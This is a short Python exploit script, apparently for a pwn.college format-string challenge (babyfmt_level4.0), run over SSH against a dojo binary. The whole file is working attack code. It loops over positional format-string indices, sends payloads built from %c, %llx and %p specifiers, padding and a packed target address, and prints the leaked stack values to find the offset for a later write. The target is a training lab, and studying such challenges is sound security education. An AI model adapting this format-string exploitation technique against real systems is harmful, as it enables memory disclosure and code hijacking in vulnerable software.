import subprocess, struct
ADDR = 0x404100
SSH = ["ssh","-i","../key","hacker@dojo.pwn.college","/challenge/babyfmt_level4.0"]
tail = "%p " * 40
pad = 3
for idx in range(20, 80):
    fmt = f"AAA |%1$143c%{idx}$llx DONE {tail}"
    payload = fmt.encode() + b"B" * pad + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    for line in out.splitlines():
        if line.startswith("AAA "):
            value = line.split("#", 1)[1].split()[0]
            print(idx, value)
            break
